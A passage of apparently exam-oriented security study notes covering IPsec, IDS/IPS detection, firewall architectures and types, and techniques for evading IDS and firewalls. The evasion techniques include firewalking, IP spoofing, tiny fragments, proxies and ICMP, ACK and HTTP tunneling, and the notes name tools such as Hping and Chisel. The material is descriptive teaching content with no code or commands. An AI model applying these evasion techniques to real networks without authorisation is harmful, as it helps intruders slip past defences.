				- For Authentication Header (AH) in tunnel mode, IPsec authenticates both the payload and the header, providing higher security than transport mode. Once the encrypted data is received, the IPsec-compliant device decrypts it. Tunnel mode is commonly used to create VPNs over the Internet for network-to-network communication (e.g., between routers and linked sites), host-to-network communication (e.g., remote user access), and host-to-host communication (e.g., private chat). It is compatible with Network Address Translation (NAT) and supports NAT traversal.
				- In tunnel mode, Encapsulation Security Payload (ESP) encrypts and optionally authenticates the entire inner IP packet, while AH authenticates the entire inner IP packet along with selected fields of the outer IP header. Tunnel mode is typically used between two gateways or between a host and a gateway.
		- IPsec Architecture:
			- IPsec provides security services at the network layer, offering flexibility in selecting the necessary security protocols and the algorithms used for these services. To meet the required security objectives, corresponding cryptographic keys may be employed when necessary. The security services provided by IPsec include access control, data origin authentication, connectionless integrity, anti-replay protection, and confidentiality. To achieve these objectives, IPsec utilizes two traffic security protocols, AH and ESP, along with cryptographic key management protocols and procedures.
			- Protocol Structure of the IPsec Architecture:
				- Authentication Header (AH): Provides integrity and data origin authentication, with an optional anti-replay feature.
				- Encapsulating Security Payload (ESP): Offers all the services provided by AH, along with confidentiality.
				- IPsec Domain of Interpretation (DOI): Defines payload formats, types of exchanges, and naming conventions for security information such as cryptographic algorithms and security policies. IPsec DOI enables ISAKMP for use with IP when IPsec relies on ISAKMP to negotiate security associations.
				- Internet Security Association and Key Management Protocol (ISAKMP): A key protocol in the IPsec architecture that establishes the required security for various types of communications—including government, private, and commercial—by integrating authentication, key management, and security associations.
				- Policy: IPsec policies help enforce network security by defining when and how to secure data, as well as specifying security methods at different network levels. These policies can be configured to meet the security requirements of a system, domain, site, organizational unit, and more.
		- IPsec Authentication and Confidentiality:
			- IPsec employs two different security services for authentication and confidentiality:
			- Authentication Header (AH): AH provides connectionless integrity, data origin authentication, and optional anti-replay protection for the data payload and certain portions of the IP header in each packet. However, it does not support data confidentiality (encryption). When establishing a Security Association (SA), the receiver can opt for anti-replay protection as an additional security measure.
			- Encapsulating Security Payload (ESP): ESP offers confidentiality in addition to the services provided by AH, including data origin authentication, connectionless integrity, and anti-replay protection. However, in transport mode, ESP does not provide integrity and authentication for the entire IP packet. ESP can be used alone, in combination with AH, or in a nested configuration. By default, it protects only the IP data payload. In tunnel mode, it secures both the payload and the IP header.

# Evading IDS, Firewalls, and Honeypots

- IDS and IPS:
	- An Intrusion Detection System (IDS) is a software-based or hardware-based security solution that monitors inbound and outbound network traffic for suspicious patterns that may indicate a security breach. It analyzes traffic for signatures matching known intrusion patterns and triggers an alert when a match is found. Depending on the type of traffic being monitored, an IDS can be placed either outside or inside the firewall to detect suspicious activity originating from external or internal sources.
	- An Intrusion Prevention System (IPS) is an advanced form of IDS, often referred to as an "active IDS," as it not only detects intrusions but also takes action to prevent them.
	- IPS is classified into two types: host-based IPS (HIPS) and network-based IPS (NIPS).
	- How IDS Detect Intrusions:
		- An Intrusion Detection System (IDS) detects intrusions using three primary methods:
		- Signature Recognition:
			- Signature recognition, also known as misuse detection, identifies events that indicate potential abuse of a system or network resource. This technique involves creating models of known intrusions and comparing incoming events against these models to detect threats. IDS signatures are designed to recognize attacks without disrupting normal system traffic. Only actual attacks should match the model to minimize false alarms.
			- This method identifies attacks by comparing network traffic against known intrusion patterns. While effective for detecting known threats, it can trigger false positives and requires frequent updates to recognize evolving threats.
		- Anomaly Detection:
			- Anomaly detection, also known as "not-use detection," differs from signature recognition by identifying deviations from normal traffic patterns. It relies on a database of anomalies and flags events that fall outside the established tolerance threshold as potential attacks. This method detects intrusions based on the fixed behavioral characteristics of users and system components. The most challenging aspect of anomaly detection is accurately modeling normal usage to minimize false positives.
			- This method identifies deviations from normal network behavior, flagging unusual activity as potential threats. While useful for detecting unknown attacks, it can generate false alarms due to network unpredictability and requires precise modeling of normal behavior.
		- Protocol Anomaly Detection:
			- Protocol anomaly detection analyzes network traffic to identify deviations from established protocol standards or expected behavior patterns. It operates on the assumption that most network protocols follow defined rules and structures. Any deviation from these norms may indicate malicious activity or a misconfiguration.
			- It detects unusual packet structures, sequence orders, and response times, helping identify misconfigurations and malicious activity.
			- The functioning of a protocol anomaly detector:
				- Baseline behavior: Establish a baseline of normal protocol behavior, including structure, sequence, timing, and content of traffic.
				- Anomaly identification: Monitor traffic for deviations, such as unusual packet structures, sequence issues, or protocol violations.
				- Detection rules: Define rules based on protocol specifications to guide the IDS in identifying anomalies.
	- Types of Intrusion Detection Systems:
		- Network-Based Intrusion Detection Systems (NIDS):
			- Network-based intrusion detection systems (NIDS) monitor all incoming network traffic to detect anomalies and malicious data. Unlike firewalls that primarily block large amounts of traffic, NIDS thoroughly inspects every packet. It captures and analyzes all network traffic, generating alerts at the IP or application level based on detected threats.
			- NIDS are more distributed than host-based intrusion detection systems (HIDS), identifying anomalies at both the router and host levels. They audit packet contents, log information about malicious activity, and assign threat levels to detected risks. This threat level helps security teams stay vigilant.
			- Typically, NIDS operate using a black-box device placed in a promiscuous mode within the network, passively listening for intrusion patterns. These systems detect malicious activities such as denial-of-service (DoS) attacks, port scans, and unauthorized attempts to access systems by monitoring network traffic.
		- Host-Based Intrusion Detection Systems (HIDS):
			- A host-based intrusion detection system (HIDS) monitors and analyzes individual system behavior. Unlike NIDS, which focus on network traffic, HIDS is installed directly on a device, ranging from desktop computers to servers. It is particularly effective at detecting unauthorized insider activity and unauthorized file modifications.
			- HIDS primarily tracks changes within local systems and is often more platform-specific, with a greater focus on Windows OS. However, versions are also available for UNIX-based systems. These mechanisms typically audit events occurring on a specific host.
			- Despite their effectiveness, HIDS are less commonly used due to the processing overhead required to monitor each system event in real time.
	- Types of IDS Alerts:
		- An Intrusion Detection System (IDS) generates four types of alerts: True Positive, False Positive, False Negative, and True Negative.
		- True Positive (Attack - Alert): A true positive occurs when an IDS correctly detects an actual attack and triggers an alarm. This means the system successfully identifies a real threat, whether it is an actual attack by a malicious actor or a security drill where penetration testing tools are used to test network defenses.
		- False Positive (No Attack - Alert): A false positive occurs when an IDS mistakenly identifies normal system activity as an attack and triggers an alarm. This can lead to unnecessary alerts, causing security personnel to become desensitized to warnings and potentially overlook real threats. During IDS configuration, administrators often analyze false positives to fine-tune detection settings and improve accuracy.
		- False Negative (Attack - No Alert): A false negative is the most critical failure of an IDS, occurring when the system fails to detect and respond to an actual attack. In this case, a threat bypasses detection, leaving the system vulnerable. Reducing false negatives is crucial for maintaining effective security.
		- True Negative (No Attack - No Alert): A true negative occurs when the IDS correctly identifies normal activity and does not generate an alert. This indicates that the system is functioning properly by distinguishing between legitimate behavior and potential threats. True negatives do not pose a risk and confirm that the IDS is operating as expected.
- Firewall:
	- A firewall is a software-based or hardware-based security system positioned at the network gateway to protect the resources of a private network from unauthorized access by users on other networks. Firewalls are typically placed at the junction or gateway between two networks, such as a private network and a public network like the Internet. They examine all incoming and outgoing traffic and block messages based on predetermined security rules that do not meet specified security criteria.
	- Firewalls can filter traffic based on various factors, including the type of traffic, source and destination addresses, and ports. To ensure maximum security, firewalls should be placed on the perimeter of the network, away from the internal resources, so that incoming requests cannot directly access private network resources.\
	- Firewall Architecture:
		- The firewall architecture consists of the following elements:
		- Bastion Host:
			- A bastion host is a specially hardened computer system designed to protect a network from external attacks. It acts as a mediator between the internal (private) and external (public) networks, ensuring that all traffic entering or leaving the network is filtered through the firewall.
			- By enforcing strict access control policies, the bastion host serves as the first line of defense in a firewall architecture, preventing unauthorized access and potential security breaches.
			- A bastion host has two network interfaces:
				- Public Interface: Directly connected to the internet, handling incoming and outgoing traffic.
				- Private Interface: Connected to the internal network (intranet), ensuring that only authorized traffic is allowed.
		- Screened Subnet (DMZ):
			- A screened subnet, also known as a Demilitarized Zone (DMZ), is a protected network segment designed to enhance security by isolating public-facing services from the internal network. It is created using a two- or three-homed firewall positioned behind a screening firewall.
			- In a three-homed firewall setup, the first interface connects to the internet, handling external traffic. The second interface connects to the DMZ, where public-facing servers such as web, email, and DNS servers are located. The third interface connects to the intranet, ensuring that private network resources remain protected. The DMZ is designed to handle public requests without exposing the internal network, meaning internet users can communicate with the DMZ but cannot access the private intranet.
			- The key advantage of a screened subnet is that public requests can be managed without allowing direct traffic into the internal network, reducing security risks. However, a major disadvantage of using a three-homed firewall is that if it is compromised, both the DMZ and the internal network could also be at risk. A more secure approach is to use multiple firewalls: one to separate the internet from the DMZ and another to separate the DMZ from the internal network.
		- Multi-Homed Firewall:
			- A multi-homed firewall is a network node equipped with multiple NICs, enabling it to connect to two or more networks. Each interface is assigned to a distinct network segment, both logically and physically, providing enhanced security and traffic control.
			- By using multiple interfaces, a multi-homed firewall improves the efficiency, reliability, and security of an IP network. With more than three interfaces, it allows for further segmentation of systems based on an organization's specific security objectives. This segmentation helps enforce stricter access controls and minimizes the risk of unauthorized access.
			- However, a more secure model is the back-to-back firewall architecture, where two or more firewalls work in tandem to create multiple layers of security. This setup provides deeper protection by further isolating network segments based on security policies and organizational needs.
	- Demilitarized Zone (DMZ):
		- In computer networks, a Demilitarized Zone (DMZ) is a designated area that hosts one or more computers or a small sub-network, acting as a neutral zone between a company's internal network and an untrusted external network. Its primary purpose is to prevent direct access to the company's private data while allowing public-facing services to remain accessible.
		- The DMZ serves as a buffer between the secure internal network and the insecure internet, adding an extra layer of security to the corporate LAN. This prevents external users from directly accessing sensitive internal resources. A DMZ is typically created using a firewall with three or more network interfaces, each assigned a specific role: one for the trusted internal network, one for the DMZ, and one for the untrusted external network (internet).
		- Any service that needs to be accessible to external users, such as email, web, or FTP servers, can be placed in the DMZ. By isolating these services from the internal network, the DMZ minimizes security risks while still allowing controlled public access.
	- Types of Firewalls:
		- Based on Configuration:
			- Network-Based Firewalls:
				- Network-based firewalls are positioned at the network perimeter to inspect packet headers and enforce security rules, protecting the private local area network (LAN) by determining whether to forward or drop packets. They are an integral part of network security and can be built into broadband routers or used as standalone devices.
				- These firewalls employ packet filtering, a technique that examines packet headers to identify the source and destination addresses. The firewall then compares this information against a predefined set of rules—either system-defined or user-configured—to decide whether the packet should be forwarded or discarded.
				- Network-based firewalls operate on an entire network rather than individual systems, using a single interface to manage traffic. Examples of network-based firewalls include Cisco ASA and FortiGate.
				- Advantages: Network-based firewalls provide enhanced security by operating with dedicated operating systems (OS), which helps reduce security risks and improve control measures. They offer high-speed processing, enabling faster response times and handling greater traffic volumes efficiently. Additionally, as independent network components, they allow for easy reconfiguration, shutdown, or relocation with minimal disruption.
				- Disadvantages: Network-based firewalls are generally more expensive than host-based alternatives and can be complex to implement and configure. They also require additional physical space and cabling, which may increase setup and maintenance efforts.
			- Host-Based Firewalls:
				- Host-based firewalls are software-based traffic filters installed on individual PCs or servers, providing security against unauthorized access, Trojans, and email worms. They function between regular applications and the networking components of the operating system.
				- A host-based firewall integrates itself into the critical application/network path, analyzing data flow against a predefined rule set. It intercepts all incoming network requests to determine their validity. Additionally, it incorporates user-defined controls, privacy controls, web filtering, and content filtering to restrict unsafe applications from running on an individual system.
				- Host-based firewalls consume more system resources than network-based firewalls, potentially reducing system performance.
				- Advantages: One of the key advantages of host-based firewalls is that they are less expensive than network-based firewalls, making them ideal for personal or home use. They are also suitable for mobile users who require digital security when working outside a corporate network. Additionally, they are easier to configure and reconfigure compared to network-based firewalls.
				- Disadvantages: Despite these benefits, host-based firewalls have some drawbacks. They consume system resources, which can slow down performance, and they can be difficult to uninstall. Moreover, they are not suitable for environments that require high-speed response times, making them less effective in performance-critical settings.
		- Based on Working Mechanism:
			- Packet Filtering Firewall:
				- A packet filtering firewall inspects and compares each packet against predefined criteria, such as source and destination IP addresses, port numbers, and protocols, to decide whether to allow or block it. Operating at the Internet layer of the TCP/IP model or the Network layer of the OSI model.
				- It analyzes packet headers information to determine routing. This firewall type efficiently controls traffic based on rule sets.
			- Circuit-Level Gateway Firewall:
				- A circuit-level gateway firewall operates at the Session layer of the OSI model or the Transport layer of the TCP/IP model. It forwards data between networks without verifying individual packets, blocking direct incoming connections while allowing traffic to pass through itself.
				- This firewall masks internal network details by making outbound traffic appear to originate from the gateway’s IP address. It monitors session requests and determines their validity by checking the TCP handshake. Unlike packet filters, circuit-level gateways control data streams rather than filtering individual packets. They are cost-effective and provide anonymity for protected networks.
			- Application-Level Firewall:
				- Application-level firewalls (proxies) operate at the Application layer of the OSI and TCP/IP models, filtering packets based on specific application protocols. They restrict traffic to supported services while blocking all others. These firewalls address the risks posed by voice, video, and collaborative traffic at lower layers, which can be exploited for unauthorized access.
				- Configured as web proxies, they can block FTP, Gopher, Telnet, and other protocols while inspecting application-specific commands like HTTP POST and GET. Unlike traditional firewalls, application-level firewalls detect and filter malicious traffic missed by stateful inspection firewalls, improving security. They also perform deep packet inspection, identifying threats hidden within legitimate protocols.
				- Application-layer firewalls can operate in one of two modes:
					- Active application-layer firewalls: These firewalls inspect all incoming requests, including the actual messages exchanged, for known vulnerabilities such as SQL injection, parameter and cookie tampering, and cross-site scripting. Only requests deemed legitimate are allowed to pass through.
					- Passive application-layer firewalls: These function similarly to intrusion detection systems (IDS) by monitoring all incoming requests for known vulnerabilities. However, unlike active firewalls, they do not actively block or reject requests, even if a potential attack is detected.
			- Stateful Multilayer Inspection Firewall:
				- Stateful multilayer inspection firewalls integrate packet filtering, circuit-level gateways, and application-layer inspection to assess both the legitimacy of network-layer sessions and the contents of packets at the application layer. They filter packets at the network layer of the OSI model (or the internet layer of the TCP/IP model) to verify whether session packets are valid, while also analyzing packet contents at the application layer.
				- By using stateful packet filtering, these firewalls overcome the limitations of traditional packet-filtering firewalls, which can only inspect attributes such as IP addresses, ports, and protocols. Additionally, stateful multilayer inspection firewalls are capable of performing deep packet inspection, enhancing security by identifying and mitigating potential threats more effectively.
			- Application Proxy:
				- An application-level proxy acts as an intermediary between a user’s workstation and the Internet, filtering connections based on protocols and service types. For example, an FTP proxy allows only FTP traffic while blocking other services. It enhances security by isolating the enterprise network from external threats. Also known as an application-level gateway, a proxy renews connections and manages communication between users and Internet services. It operates on a firewall host, often a dual-homed or bastion host, for security purposes.
				- Caching proxies improve efficiency by storing frequently requested data, reducing network load and response times. Proxy servers offer both security and caching benefits while providing a transparent experience, making it appear as though users and servers are directly communicating.
				- Advantages: They enhance logging capabilities by understanding application protocols, enabling effective activity monitoring. They also reduce network load by caching frequently requested data, allowing direct retrieval from the system instead of the network. Proxy systems provide user-level authentication since they actively manage connections. Additionally, they protect weak or faulty IP implementations by acting as intermediaries, generating new IP packets on behalf of clients.
				- Disadvantages: proxy services have some drawbacks. They may lag behind non-proxy services until suitable proxy software is available. Different services within a proxy might require separate servers, increasing complexity. Furthermore, proxy services may necessitate changes in client configurations, applications, or procedures, which can add to administrative overhead.
			- Network Address Translation (NAT):
				- Network Address Translation (NAT) separates IP addresses into two sets, allowing a LAN to manage both internal and external traffic while preserving address privacy. NAT helps conceal the internal network layout and directs all connections through a single choke point, enhancing security.
				- It also works with a router, NAT modifies packets in real-time, similar to packet filtering. When an internal machine sends a packet to an external machine, NAT changes the source address to make it appear as if it originates from a valid external address. Conversely, when the external machine responds, NAT modifies the destination address to map it back to the correct internal device. Additionally, NAT can alter source and destination port numbers as needed.
				- NAT reduces the number of public IP addresses required by an organization and can function as a firewall by allowing only outbound connections from the internal network while blocking unsolicited inbound connections from external sources.
				- NAT Translation Schemes:
					- NAT systems use different methods to translate between internal and external addresses:
					- One-to-One Mapping: Each internal address is assigned a dedicated external address, maintaining a consistent translation. However, this method slows down connections and does not save address space.
					- Dynamic Address Allocation: An external address is dynamically assigned to an internal host when it initiates a connection, without modifying port numbers. This limits the number of simultaneous connections to the number of available external addresses.
					- Static Address with Port Mapping: Internal addresses are mapped to a fixed external address, but port mapping allows multiple internal machines to share the same external address.
					- Dynamic Address and Port Allocation: Each time an internal host initiates a connection, an external address and port pair are dynamically assigned. This method optimizes address usage most efficiently.
				- Advantages:It enhanced security by enforcing firewall controls over outbound connections and restricting incoming traffic to only those packets that are part of an active session initiated from within the network. Additionally, it conceals the internal network’s configuration, making it harder for attackers to target specific systems.
				- Disadvantages: NAT also has drawbacks. It must determine how long to retain a translation, which can be unpredictable. It may interfere with encryption and authentication systems, potentially impacting data security. Furthermore, dynamic port allocation can cause conflicts with packet filtering mechanisms, leading to network disruptions.
			- Virtual Private Network (VPN) Firewall:
				- A Virtual Private Network (VPN) is a secure network that allows access to a private network over the Internet. VPNs are commonly used to connect Wide Area Networks (WANs), enabling computers on one network to connect to computers on another network. They ensure the secure transmission of sensitive information over an untrusted network through encapsulation and encryption. By employing encryption and integrity protection, VPNs enable the use of a public network as if it were a private one.
				- A VPN handles encryption and decryption outside the packet-filtering perimeter, allowing for the inspection of packets from other sites. It establishes a virtual point-to-point connection using dedicated connections and encapsulates packets sent over the Internet. This setup combines the advantages of both public and private networks.
				- While VPNs are not directly related to firewall technology, firewalls can enhance VPN functionality by adding additional security features. Firewalls help provide secure remote access and manage traffic flow through the VPN tunnel. A device running VPN software can only access the VPN, ensuring a secure connection. VPN firewalls improve security by encrypting data and controlling the flow of traffic between VPN endpoints, ensuring that only authorized traffic passes through while applying firewall rules to prevent unauthorized access.
				- Advantages: A VPN conceals all traffic that flows through it, ensuring encryption, and safeguarding data from unauthorized access or snooping. Additionally, it provides remote access to various protocols while protecting users from potential attacks originating from the broader Internet.
				- Disadvantages: Since the VPN operates over a public network, users can still be vulnerable to attacks on the destination network, despite the security measures in place.
			- Next-Generation Firewalls (NGFWs):
				- Next-generation firewalls (NGFWs) are advanced network security solutions that build upon the capabilities of traditional firewalls. They incorporate features such as deep packet inspection, application awareness and control, integrated intrusion prevention systems (IPS), and cloud-based threat intelligence. These enhanced capabilities enable NGFWs to effectively address dynamic and evolving threat landscapes, providing stronger protection for modern networks.
				- NGFWs operate by analyzing network traffic across multiple layers of the OSI model. This multilayer inspection allows them to detect and block sophisticated threats. They inspect packet payloads, monitor applications, and identify unusual traffic patterns. By integrating various security functions into a single platform, NGFWs enable centralized management and more efficient security operations.
				- NGFWs offer integrated security features like IPS, antimalware, and content filtering, along with detailed visibility into network traffic, user activity, and application behavior for better monitoring and threat detection. They can block sophisticated attacks such as zero-day exploits, ransomware, and APTs using advanced threat intelligence. However, they are more expensive and complex to configure and manage than traditional firewalls, and their advanced functions may introduce latency.
	- Firewall Limitations:
		- Firewall can block access to services like FTP and Telnet, and may restrict Internet access.
		- Firewalls cannot prevent internal attacks, such as those from disgruntled employees working with external attackers, nor can they protect against social engineering or data-driven attacks like phishing emails.
		- Firewalls focus security at a single point, which leaves other systems vulnerable, and can create a bottleneck if all traffic passes through them.
		- They also cannot defend against zero-day viruses or issues caused by faulty network design.
		- Firewalls are not a replacement for antivirus or antimalware tools, cannot block attacks at higher protocol layers, and cannot handle tunneled traffic or threats from infected external devices.
- IDS, IPS, and Firewall Solutions:

		- YARA is a malware research tool that enables security analysts to detect and classify malware or other malicious code using a rule-based approach. It is a multi-platform tool that runs on Windows, macOS, and Linux. YARA allows analysts to create “rules” or descriptions of malware families using text or binary patterns. These rules analyze specific patterns in files and alert analysts if a file is harmful.
		- A YARA rule consists of a Boolean expression and strings that define its logic. Analysts can use YARA rules to examine private databases or scan malicious binaries across an organization to detect intrusions. Additionally, YARA supports various pattern formats, such as hexadecimal or plain text, along with special operators and strings, allowing analysts to effectively detect a wide range of malware signatures.
		- YARA Tools:

- Evading IDS/Firewalls:
	- IDS/Firewall Evasion Techniques (Identification):
		- Port Scanning:
			- Ports are points through which computers send or receive information from network resources. Port scanning is used to identify open ports and the services running on them. Finding open ports is often an attacker’s first step toward gaining access to a target system. Open ports can then be further probed to identify the version of services, which can help in finding vulnerabilities in these services. Attackers sometimes use automated port-scanning utilities, many of which are easily available.
			- IDSs (Intrusion Detection Systems) can also be identified using port-scanning techniques, which help detect the presence and configuration of security solutions on a network. Attackers frequently employ port scanning to gather information about the services running on a network, including those protected by an IDS.
			- For example, ManageEngine Firewall Analyzer listens on UDP ports 514 and 1514, Snort IDS listens on TCP port 80 and UDP port 53, and Forcepoint NGFW listens on TCP port 443 and UDP port 546.
		- Firewalking:
			- Firewalking is a method used to collect information about remote networks behind firewalls. It is a technique that utilizes TTL (Time to Live) values to determine gateway ACL (Access Control List) filters and map networks by analyzing the response of IP packets. It probes ACLs on packet-filtering routers and firewalls using a method similar to tracerouting. Firewalking involves sending TCP or UDP packets into the firewall where the TTL value is one hop greater than the targeted firewall. If the packet passes through the gateway, the system forwards it to the next hop, where the TTL equals one, and prompts an ICMP error message at the point of rejection, with a "TTL exceeded in transit" message. This method helps locate a firewall, and additional probing can facilitate fingerprinting and identification of vulnerabilities.
			- The detailed information obtained from firewalking can also assist attackers in crafting more precise and stealthy attack strategies, potentially aiding in IDS evasion. Understanding firewall rules can help attackers avoid detection by exploiting allowed ports and protocols, thereby reducing the likelihood of triggering IDS alerts.
			- Firewalk is a well-known tool used for firewalking. It has two phases: a network discovery phase and a scanning phase. It is available in various open-source Linux distributions. Nmap also includes a firewalk script that can be used to perform firewalking. Both Firewalk and the Nmap firewalk scripts provide critical insights into network configurations and firewall rules that can be leveraged to bypass security measures, including IDS, when combined with other evasion techniques.
		- Banner Grabbing:
			- Banners are service announcements provided by applications in response to connection requests, often containing vendor and version information. Banner grabbing is a simple fingerprinting technique used to identify the vendor and firmware version of a firewall or other network services. Knowing the exact firmware or server version allows attackers to craft payloads that exploit known vulnerabilities while avoiding IDS detection patterns.
			- Banner grabbing helps identify the services running on a system. The information obtained can include details about IDS configurations and the target system’s setup. Attackers use this knowledge to understand how an IDS is configured and tailor their actions to evade known detection rules. Additionally, banner grabbing can reveal services running on firewalls. The three primary services that send banners are FTP, Telnet, and web servers.
			- A firewall does not block banner grabbing because the connection between the attacker’s system and the target appears legitimate. Banner grabbing is used to extract banner and application information. For instance, when a user opens a Telnet connection to a known port on the target server and presses Enter a few times, the server may display a response revealing its service details.
			- Many applications respond to connections on specific ports, making them susceptible to banner grabbing. The information obtained can help attackers refine their strategy to further compromise the system. By knowing the web server's vendor and version, an attacker can focus on platform-specific exploit techniques. Services running on ports such as FTP, Telnet, and web servers should not remain open unless necessary, as they are vulnerable to banner grabbing.
		- IP Address Spoofing:
			- IP address spoofing is a technique used by attackers to evade firewalls and Intrusion Detection Systems (IDS) by masquerading as trusted sources. This method involves altering the source IP address in packet headers to conceal the attacker's true identity and bypass security measures. Firewalls and IDS often filter packets based on their source IP addresses to determine whether they originate from legitimate or malicious sources. Attackers create IP packets with forged source addresses, making them appear as though they were sent by a trusted host. By modifying the IP packet header, attackers can deceive the destination host into believing the packet originates from a reliable source.
			- IP spoofing helps attackers hide their true IP addresses, making it difficult for security systems to trace the origin of an attack. By spoofing trusted IP addresses, attackers can gain unauthorized access to systems and networks. Spoofed IP addresses also allow attackers to evade IDS detection, as some systems filter out traffic only from known malicious sources.
			- Many firewalls filter traffic based on IP addresses. By spoofing an IP address, attackers can bypass these filters and gain access to protected networks. IDS solutions also monitor packets from legitimate sources, but attackers can circumvent these defenses using spoofed IP addresses. This technique is commonly used in spamming, phishing, and denial-of-service (DoS) attacks. Tools such as Hping allow attackers to create custom packets with forged IP addresses.
		- Source Routing:
			- Source routing is a technique in which the sender of a packet specifies the route it should take through the network. Attackers use this method to direct packets through less-secured, less-monitored, or alternative network segments where IDS/firewall solutions are either partially implemented or absent. This approach helps attackers reduce the likelihood of triggering IDS alerts and logging access attempts.
			- As packets travel through the network, each router typically examines the destination IP address and determines the next hop to forward the packet. However, in source routing, the sender makes some or all of these routing decisions instead of allowing the network to handle them dynamically.
			- Source routing is categorized into two types:
				- Loose Source Routing: The sender specifies one or more intermediate nodes that the packet must pass through, but routers can still determine other parts of the route.
				- Strict Source Routing: The sender dictates the exact route the packet must follow, and routers must adhere to this predefined path.
		- Tiny Fragments:
			- Attackers create tiny fragments of outgoing packets, forcing some of the TCP packet’s header information into the next fragment. This fragmentation makes it difficult for an Intrusion Detection System (IDS) to reassemble the full traffic stream, which is essential for detecting malicious patterns effectively. Since IDS filter rules rely on recognizing specific patterns, they may fail to match fragmented packets due to the broken header information.
			- The attack succeeds if the filtering router inspects only the first fragment and allows the remaining fragments to pass unchecked. This technique is commonly used to bypass user-defined filtering rules and is particularly effective when a firewall examines only TCP header information without reassembling the full packet.
		- Bypassing Blocked Sites Using an IP Address Instead of a URL:
			- This method involves entering a blocked website’s IP address directly into the browser’s address bar instead of using its domain name. For example, to access Facebook, a user can type its IP address instead of its domain name.
			- Services such as Host2IP can help users find the IP address of a blocked website. However, this method may fail if the blocking software monitors and restricts access based on the IP address rather than just the domain name.
		- Bypassing Blocked Sites Using Anonymous Web-Surfing Services:
			- Anonymous web-surfing sites allow users to browse the internet anonymously and access blocked websites, bypassing firewall restrictions. These sites help users visit restricted pages without revealing their IP address. Some anonymous browsing services also offer the option to encrypt website URLs for added security.
			- A proxy service can be used to access blocked websites. These proxy websites hide the user’s actual IP address and display a different one, preventing websites from detecting and blocking access.
			- Anonymize VPN (anonymize.com): Anonymize VPN routes all internet traffic through an encrypted tunnel, securing connections from the user’s device to protected servers and networks. It also masks the real IP address, ensuring continuous anonymity for all online activities.
			- Online Anonymizers:
				- anonymize.com
				- 2ip.io/anonim
				- www.kproxy.com
				- zendproxy.com
				- proxify.com
				- www.proxysite.com
				- anonymouse.org
				- proxyscrape.com
		- Bypassing IDS/Firewall Using Proxy Server:
			- Find a suitable proxy server.
			- Configure proxy settings on a Windows system:
				- Open the Control Panel and navigate to Network and Internet → Internet Options.
				- In the Internet Options dialog box, go to the Connections tab and click "LAN settings."
			- Under LAN Settings, check the "Use a proxy server for LAN" option.
			- In the Address box, enter the IP address of the proxy server.
			- In the Port box, enter the port number used by the proxy server for client connections (default: 8080).
			- (Optional) Check "Bypass proxy server for local addresses" if do not want the proxy server to be used for local network connections.
			- Click OK to close the LAN Settings dialog box.
			- Click OK again to close the Internet Options dialog box.
		- Bypassing IDS/Firewall Using ICMP Tunneling Method:
			- The ICMP protocol is primarily used to send error messages and operational information between network devices. Since it is essential for network communication, many users keep it enabled on their networks. Additionally, ICMP is generally not perceived as a significant security risk. However, attackers can exploit this enabled ICMP protocol to perform ICMP tunneling, allowing them to transmit malicious data into the target network. Through ICMP tunneling, attackers can gain full access to a compromised network.
			- ICMP tunneling works by embedding a backdoor shell within the data portion of ICMP Echo packets. According to RFC 792, which defines ICMP operation, the data portion of ICMP packets is unspecified. As a result, most firewalls and IDS solutions do not inspect this portion, allowing arbitrary data—including a backdoor application—to be transmitted undetected. Some administrators leave ICMP open on their firewalls/IDS because it is necessary for tools like ping and traceroute.
			- If ICMP is allowed through the firewall, an attacker can use a tool like ICMPTX (codeberg.org) to tunnel commands inside the payload of ICMP Echo packets, effectively bypassing security controls.
		- Bypassing IDS/Firewall Using ACK Tunneling Method:
			- ACK tunneling is a technique attackers use to bypass firewalls and IDS by exploiting the generally trusted nature of ACK (Acknowledgment) packets. Traditional packet-filtering firewalls define their rule sets primarily based on SYN (Synchronization) packets, which initiate TCP connections. These firewalls often assume that malicious payloads are most likely to be present in SYN packets because they start a session. Once a session is established, ACK packets are used to acknowledge the receipt of data packets. Since these packets follow an ongoing session, firewalls and IDS typically treat them as legitimate traffic.
			- To optimize performance, many firewalls do not inspect ACK packets as rigorously as SYN packets, as a single SYN packet can generate multiple ACK packets in response. Attackers exploit this by injecting malicious payloads into ACK packets, taking advantage of the reduced scrutiny. By tunneling a backdoor application inside TCP packets with the ACK flag set, attackers can bypass firewalls and potentially evade IDS detection.
			- Steps Involved in ACK Tunneling:
				- The attacker establishes a legitimate TCP connection with the target server.
				- Using tools such as Hping or Nping, the attacker crafts ACK packets embedded with malicious payloads. These packets are sent through an existing session to avoid detection.
				- Since firewalls generally assume ACK packets are part of legitimate traffic, they allow them through without thorough inspection. Similarly, IDS solutions may overlook these packets if their focus is primarily on SYN packets or other types of traffic.
		- Bypassing IDS/Firewall Using HTTP Tunneling Method:
			- HTTP tunneling allows attackers to bypass IDS/firewall restrictions and perform various internet tasks. This method can be used if the target company has a public web server where port 80 is open for HTTP traffic and is not filtered by its IDS/firewall. The attacker encapsulates data inside HTTP traffic (via port 80). Many firewalls, including IDS solutions, do not inspect the payload of HTTP packets to verify their legitimacy. As a result, attackers can tunnel traffic through TCP port 80.
			- Tools such as Chisel (github.com) use this technique to tunnel traffic across TCP port 80. Additionally, attackers can leverage tools like HTTPort, HTTHost, and Tunna to perform HTTP tunneling and bypass IDS/firewall protections.
			- Why Do I Need HTTP Tunneling:
				- HTTP tunneling is used in scenarios where network users have restricted connectivity due to a firewall or proxy. In such cases, certain applications may also lack native communication support.
				- Restrictions may include:
					- Blocking of TCP/IP ports, externally initiated traffic, and all network protocols except for a few commonly used ones.
					- Accessing blocked websites.
					- Posting in forums anonymously by hiding the IP address.
					- Using applications such as chat services (ICQ, IRC), instant messengers, games, and web browsers.
					- Securely sharing confidential resources over HTTP.
					- Downloading files with filtered extensions or potentially malicious code.
			- For example, if an organization’s firewall restricts access to all ports except 80 and 443, a user who needs FTP access would be blocked. HTTP tunneling allows FTP usage via the HTTP protocol by creating a bidirectional virtual data connection encapsulated in HTTP traffic.
			- This process works as follows: FTP client software encapsulates FTP data packets (or other protocols like SOAP or JRMP) within HTTP packets, typically using local port 80. These packets are then sent through the firewall or proxy server as standard internet traffic. The HTTP tunneling server, located outside the network, receives these packets, unwraps the FTP data, and forwards them to the remote FTP server, enabling seamless communication.
			- HTTP Tunneling Tools - HTTPort and HTTHost (www.targeted.org):
				- HTTPort allows users to bypass HTTP proxies that block Internet access to services such as email, instant messaging, P2P file sharing, ICQ, newsgroups, FTP, and IRC. The Internet software is configured to connect to a local PC as if it were the required remote server. HTTPort then intercepts that connection and tunnels it through the proxy. It can function on devices such as proxies, IDSs, or firewalls that permit HTTP traffic, thereby enabling access to websites and Internet applications.
